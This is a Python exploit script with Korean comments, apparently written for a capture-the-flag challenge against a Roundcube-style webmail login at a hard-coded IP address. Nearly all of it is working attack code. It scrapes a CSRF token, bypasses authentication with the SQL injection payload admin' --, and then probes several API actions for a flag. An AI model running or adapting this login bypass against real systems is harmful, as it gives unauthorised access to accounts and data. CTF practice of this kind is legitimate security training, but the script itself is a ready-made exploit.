#!/usr/bin/env python3
"""
Stage 3 최종 공략
목표: SQLi 로그인 우회 + get_flag 액션으로 flag 획득
"""

import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

TARGET = "http://13.125.104.131:30083"
ADMIN_PAYLOAD = "admin' --"  # SQLi 로그인 우회
PASS = "anything"  # SQLi bypass이므로 패스워드는 의미 없음

def login_sqli_bypass():
    """SQLi를 이용한 로그인 우회 (admin' --)"""
    print("[*] Attempting SQLi login bypass...")

    sess = requests.Session()

    # 1. CSRF 토큰 획득
    try:
        r = sess.get(TARGET + "/?_task=login", verify=False, timeout=10)
        token_match = re.search(r'"request_token":"([^"]+)"', r.text)
        if not token_match:
            print("[!] No CSRF token found")
            return None

        csrf_token = token_match.group(1)
        print(f"[+] CSRF token obtained: {csrf_token[:20]}...")
    except Exception as e:
        print(f"[!] Error getting CSRF token: {e}")
        return None

    # 2. SQLi 로그인 시도 (admin' --)
    creds = {
        "_token": csrf_token,
        "_task": "login",
        "_action": "login",
        "_user": ADMIN_PAYLOAD,
        "_pass": PASS,
    }

    try:
        r = sess.post(TARGET + "/?_task=login", data=creds, allow_redirects=False, verify=False, timeout=10)
        if r.status_code == 302:
            print("[+] SQLi login bypass SUCCESS (302 redirect)")
            print(f"    Location: {r.headers.get('Location')}")
            return sess
        else:
            print(f"[-] Login returned {r.status_code}, trying anyway...")
            return sess  # 302가 아니어도 계속 진행
    except Exception as e:
        print(f"[!] Login error: {e}")
        return None


def get_flag(sess):
    """get_flag 액션 호출하여 flag 획득"""
    print("\n[*] Attempting get_flag action...")

    # 여러 엔드포인트 시도
    endpoints = [
        "/?_action=get_flag",
        "/?_task=mail&_action=get_flag",
        "/?_task=settings&_action=get_flag",
        "/?_action=get_flag&_task=mail",
    ]

    for endpoint in endpoints:
        try:
            url = TARGET + endpoint
            print(f"    Trying: {endpoint}")
            r = sess.get(url, verify=False, timeout=10)

            if r.status_code == 200:
                print(f"[+] Response (200): {r.text[:500]}")

                # JSON 응답인지 확인
                try:
                    data = json.loads(r.text)
                    if "flag" in data:
                        print(f"[+] FLAG FOUND: {data['flag']}")
                        return data['flag']
                    else:
                        print(f"[+] JSON response: {data}")
                        if "exec" in data:
                            print(f"    exec field: {data.get('exec', '')}")
                except:
                    # JSON이 아니면 그냥 텍스트로 flag 검색
                    if "flag" in r.text.lower() or "htb{" in r.text.lower():
                        print(f"[+] Possible flag in response")
                        # FLAG 패턴 추출
                        matches = re.findall(r'(HTB\{[^}]+\}|flag[=:]\s*[^\s<]+)', r.text, re.IGNORECASE)
                        if matches:
                            print(f"[+] Extracted: {matches}")
                            return matches[0] if matches else None
        except Exception as e:
            print(f"    Error: {e}")

    return None


def test_api_actions(sess):
    """다른 API 액션들 탐색"""
    print("\n[*] Testing other API actions...")

    # Roundcube API 액션 목록
    actions = [
        "ping",
        "check-recent",
        "getunread",
        "get_flag",
        "flag",
        "readflag",
        "fetchflag",
    ]

    for action in actions:
        try:
            url = f"{TARGET}/?_action={action}"
            r = sess.get(url, verify=False, timeout=5)
            if r.status_code == 200 and len(r.text) > 50:
                print(f"[+] Action '{action}': {len(r.text)} bytes")
                if "flag" in r.text.lower() or "htb{" in r.text.lower():
                    print(f"    Response snippet: {r.text[:200]}")
        except:
            pass


if __name__ == "__main__":
    print("=" * 70)
    print("Stage 3: SQLi Bypass + get_flag Action Exploitation")
    print("=" * 70)

    # 1. SQLi 로그인 우회
    sess = login_sqli_bypass()
    if not sess:
        print("[!] Login bypass failed, exiting")
        sys.exit(1)

    # 2. get_flag 액션 호출
    flag = get_flag(sess)

    # 3. 다른 액션 탐색
    test_api_actions(sess)

    print("\n[*] Test completed")
